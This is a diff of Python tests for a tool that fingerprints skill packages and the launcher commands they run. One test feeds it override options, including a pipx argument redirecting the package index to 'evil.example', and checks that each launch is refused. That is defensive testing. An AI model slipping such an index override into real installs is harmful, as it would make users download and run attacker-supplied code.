@@ -83,16 +83,18 @@ def test_a_spellwarden_script_changes_the_package_hash_and_the_lock_does_not():
     assert with_script != plain and other_script != with_script
 
 
-def test_a_root_skill_keeps_its_identity_when_the_command_files_change():
-    """r0:F2: with the skill at the repository root the command's own files sit at the package top; writing the baseline
-    entry that accepts an SW-REG finding must not change the identity the finding is fingerprinted with."""
+def test_the_strip_rule_is_the_same_at_every_root_and_drops_the_lock_only():
+    """Owner decision S2 (build review r1:F2): the hosted side hashes a forge archive with root "" and the command the
+    tree under the skill's root, so the drop rule cannot depend on the root. Only the top `.spellwarden/lock.json` is
+    dropped; `config.yml` and `baseline.yml` at a package top are hashed like any file, at the repository root too."""
     base = {"SKILL.md": b"a", "lib/a.py": b"b"}
-    plain = package_sha256(package_files(base, "", []).files)
-    for name in (".spellwarden/config.yml", ".spellwarden/baseline.yml", ".spellwarden/lock.json"):
-        assert package_files({**base, name: b"x: 1"}, "", []).files == base
-        assert package_sha256(package_files({**base, name: b"x: 2"}, "", []).files) == plain
-    assert package_sha256(package_files({**base, ".spellwarden/run.sh": b"r"}, "", []).files) != plain
-    nested = {**base, "lib/.spellwarden/baseline.yml": b"x"}
+    for root, prefix in (("", ""), ("skills/foo", "skills/foo/")):
+        files = {prefix + path: content for path, content in base.items()}
+        plain = package_sha256(package_files(files, root, []).files)
+        assert package_sha256(package_files({**files, prefix + ".spellwarden/lock.json": b"{}"}, root, []).files) == plain
+        for name in (".spellwarden/config.yml", ".spellwarden/baseline.yml", ".spellwarden/run.sh"):
+            assert package_sha256(package_files({**files, prefix + name: b"x: 1"}, root, []).files) != plain, (root, name)
+    nested = {**base, "lib/.spellwarden/lock.json": b"x"}
     assert package_files(nested, "", []).files == nested
 
 
@@ -670,3 +672,40 @@ def test_a_boolean_letter_before_an_artefact_or_source_letter_enters_the_args_ha
 def test_a_quiet_letter_before_an_artefact_letter_is_still_dropped():
     assert command_identity("npx", ["-yp", "pkg@1.0.0"], {}).identity == "cmd:npx pkg@1.0.0"
     assert command_identity("npx", ["-yfp", "pkg@1.0.0"], {}) == command_identity("npx", ["-fp", "pkg@1.0.0"], {})
+
+
+def test_a_double_dash_ends_the_launchers_options():
+    """`--` is the end-of-options marker every launcher accepts: the next token is the package, and the marker itself is
+    not an argument (build review r0:F7)."""
+    assert command_identity("npx", ["--", "pkg@1.0.0"], {}) == command_identity("npx", ["pkg@1.0.0"], {})
+    assert command_identity("npx", ["-y", "--", "pkg@1.0.0", "--", "x"], {}).identity.startswith("cmd:npx pkg@1.0.0 args=")
+    assert command_identity("uvx", ["--", "pkg"], {}) == CommandIdentity(None, "unpinned")
+
+
+def test_an_override_option_refuses_the_launch_whatever_its_value():
+    """r1:F1: the config-file options take a value, so a value starting with `-` is not an unknown option; and the
+    launch is refused as `launch_override` before anything is read as the package."""
+    for command, args in (("npx", ["--node-options", "--max-old-space-size=4096", "pkg@1.0.0"]),
+                          ("npx", ["--globalconfig", "--x", "pkg@1.0.0"]),
+                          ("pnpm", ["dlx", "--config.registry", "--x", "pkg@1.0.0"]),
+                          ("npx", ["--userconfig", "./x", "pkg@1.0.0"]),
+                          ("uvx", ["--config-file", "/home/dev/alt.toml", "pkg==1.0"]),
+                          ("uvx", ["--env-file", ".env", "pkg==1.0"]),
+                          ("uvx", ["--project", "../other", "pkg==1.0"]),
+                          ("pipx", ["run", "--pip-args", "--index-url=https://evil.example/simple", "--spec", "pkg==1.0.0", "pkg"])):
+        assert command_identity(command, args, {}) == CommandIdentity(None, "launch_override"), (command, args)
+
+
+def test_a_flags_only_cluster_hashes_like_its_separate_letters():
+    """r1:F5: `-yf` is `-y -f`; the quiet letter is dropped and the flag hashes as `-f` does on its own."""
+    assert command_identity("npx", ["-yf", "pkg@1.0.0"], {}) == command_identity("npx", ["-f", "pkg@1.0.0"], {})
+    assert command_identity("npx", ["-yf", "pkg@1.0.0"], {}) == command_identity("npx", ["-y", "-f", "pkg@1.0.0"], {})
+    assert command_identity("docker", ["run", "-itd", IMAGE], {}) == command_identity("docker", ["run", "-i", "-t", "-d", IMAGE], {})
+
+
+def test_the_env_element_cannot_be_forged_by_an_argument():
+    """r0:F6: the env key names enter the hash as a nested list, so no argument string and no key with a comma in it can
+    produce the identity of another launch."""
+    with_env = command_identity("npx", ["pkg@1.0.0"], {"FOO": "1"}).identity
+    assert with_env != command_identity("npx", ["pkg@1.0.0", "env:FOO"], {}).identity
+    assert command_identity("npx", ["pkg@1.0.0"], {"A,B": "1"}).identity != command_identity("npx", ["pkg@1.0.0"], {"A": "1", "B": "2"}).identity
